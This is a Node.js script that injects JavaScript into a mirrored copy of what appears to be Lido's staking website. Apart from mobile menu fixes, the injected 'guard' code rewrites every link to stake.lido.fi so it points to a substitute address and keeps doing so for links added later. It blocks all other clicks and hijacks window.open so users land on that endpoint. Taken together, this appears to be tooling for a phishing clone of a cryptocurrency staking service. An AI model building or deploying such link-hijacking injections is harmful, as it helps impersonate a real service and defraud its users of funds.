const fs = require('fs');
const path = require('path');
const cheerio = require('cheerio');

const FILE = path.resolve('./mine-site/index.html');

const STAKE_BASE = 'http://localhost:8001/';

if (!fs.existsSync(FILE)) {
	console.error('Не найден файл:', FILE);
	process.exit(1);
}

const html = fs.readFileSync(FILE, 'utf8');
const $ = cheerio.load(html, { decodeEntities: false });

$('script,style')
	.filter((_, el) => {
		const t = $(el).html() || '';
		const m = $(el).attr('id') || '';
		return /MAIN GUARD|BURGER|mirror-burger|mirror-main-burger|panel wire|MAIN ENHANCE/i.test(
			t + m
		);
	})
	.remove();

$('script[src*="mirror-controls.js"]').remove();

let ctas = [];
$('a[href],button').each((_, el) => {
	const $el = $(el);
	const href = ($el.attr('href') || '').trim();
	const txt = ($el.text() || '').trim().toLowerCase();
	const looksStake =
		/https?:\/\/(www\.)?stake\.lido\.fi/i.test(href) ||
		/(^|\W)stake(\W|$)/i.test(txt);
	if (looksStake) ctas.push($el);
});
ctas.slice(0, 2).forEach(($el) => $el.attr('data-active-stake', ''));

const burgerCSS = `
<style id="mirror-burger-wire">
/* кнопка видна только на узких экранах */
@media (min-width:1024px){ [data-testid="burger-button"], .header-content_burgerButton__R1HVQ { display:none !important; } }
@media (max-width:1023px){ [data-testid="burger-button"], .header-content_burgerButton__R1HVQ { display:inline-flex !important; } }
/* оверлей и показ панели */
#mirror-burger-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:99997;display:none}
#mirror-burger-backdrop.open{display:block!important}
#mirror-burger-panel{position:fixed;right:0;top:0;height:100vh;width:78vw;max-width:420px;z-index:99998;display:none;overflow:auto}
#mirror-burger-panel.open{display:block!important}
</style>
`;

const burgerJS = `
<script>
/* MAIN BURGER PANEL WIRE v4 (mine-site) */
(function(){
  var MOBILE = window.matchMedia('(max-width:1023px)');
  var BTN_SEL = '[data-testid="burger-button"], .header-content_burgerButton__R1HVQ';
  var NAV_SEL = 'nav[data-testid="burger"], nav[class*="burger-menu_burger"]';

  var btn  = document.querySelector(BTN_SEL);
  var pane = document.querySelector(NAV_SEL);

  // если панель найдена — делаем из неё off-canvas
  if (pane) {
    pane.id = 'mirror-burger-panel';
    // снять singlefile скрытия
    [btn, pane].forEach(function(el){
      if(!el) return;
      el.classList && el.classList.remove('sf-hidden');
      if(el.style){ el.style.removeProperty('display'); el.style.removeProperty('visibility'); }
    });

    var backdrop = document.getElementById('mirror-burger-backdrop');
    if (!backdrop) {
      backdrop = document.createElement('div');
      backdrop.id = 'mirror-burger-backdrop';
      document.body.appendChild(backdrop);
    }

    if (btn) {
      if (btn.tagName === 'A') btn.removeAttribute('href'); // не навигировать
      btn.setAttribute('type','button');
      btn.addEventListener('click', function(e){
        if (!MOBILE.matches) return;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        pane.classList.add('open'); backdrop.classList.add('open');
      }, true);
    }

    backdrop.addEventListener('click', function(){ pane.classList.remove('open'); backdrop.classList.remove('open'); }, true);
    document.addEventListener('keydown', function(e){ if(e.key==='Escape'){ pane.classList.remove('open'); backdrop.classList.remove('open'); } }, true);
    MOBILE.addEventListener('change', function(){ if(!MOBILE.matches){ pane.classList.remove('open'); backdrop.classList.remove('open'); } });
  } else {
    console.warn('burger panel not found (nav[data-testid="burger"])');
  }
})();
</script>
`;

const guardJS = `
<script>
/* MAIN GUARD v2 ACTIVE (mine-site) */
(function(){
  var STAKE = '${STAKE_BASE}';

  function toArr(x){return Array.prototype.slice.call(x||[]);}
  function isStakeUrl(h){ return /^https?:\\/\\/(www\\.)?stake\\.lido\\.fi(\\/|$)/i.test(h||''); }

  // переписать href на stake → на наш STAKE
  toArr(document.querySelectorAll('a[href]')).forEach(function(a){
    var h = a.getAttribute('href') || '';
    if (isStakeUrl(h)) a.setAttribute('href', STAKE);
  });

  // следим за будущими изменениями (если что-то динамически подменится)
  new MutationObserver(function(ms){
    ms.forEach(function(m){
      if (m.type==='attributes' && m.attributeName==='href' && m.target.tagName==='A') {
        var h = m.target.getAttribute('href')||''; if (isStakeUrl(h)) m.target.setAttribute('href', STAKE);
      }
      if (m.type==='childList') {
        toArr(m.addedNodes).forEach(function(n){
          if (n.nodeType===1) toArr(n.querySelectorAll('a[href]')).forEach(function(a){
            var h=a.getAttribute('href')||''; if(isStakeUrl(h)) a.setAttribute('href', STAKE);
          });
        });
      }
    });
  }).observe(document.documentElement, {subtree:true, childList:true, attributes:true, attributeFilter:['href']});

  // перехватываем клики: разрешены только data-active-stake (и любые явные ссылки на stake → в наш STAKE)
  var types = ['click','pointerdown','mousedown','mouseup','auxclick','touchstart','touchend'];
  function handler(e){
    var path = e.composedPath ? e.composedPath() : [e.target];
    var a = path.find && path.find(function(el){ return el && el.tagName==='A' && el.getAttribute; });
    if (!a) return;
    var href = a.getAttribute('href') || '';
    if (a.hasAttribute('data-active-stake') || isStakeUrl(href)) {
      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
      location.href = STAKE; return;
    }
    // остальное — глушим
    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
  }
  types.forEach(function(t){ document.addEventListener(t, handler, true); });

  // блокируем window.open к оригинальному stake
  var _open = window.open;
  window.open = function(url){
    if (isStakeUrl(String(url||''))) { location.href = STAKE; return null; }
    return null;
  };
})();
</script>
`;

const $body = $('body');
$body.append('\n' + burgerCSS + '\n' + burgerJS + '\n' + guardJS + '\n');

fs.writeFileSync(FILE + '.bakBeforeMineInject', html, 'utf8');
fs.writeFileSync(FILE, $.html(), 'utf8');

console.log(
	'✓ mine-site/index.html обновлён: добавлены BURGER WIRE + MAIN GUARD, помечены CTA.'
);
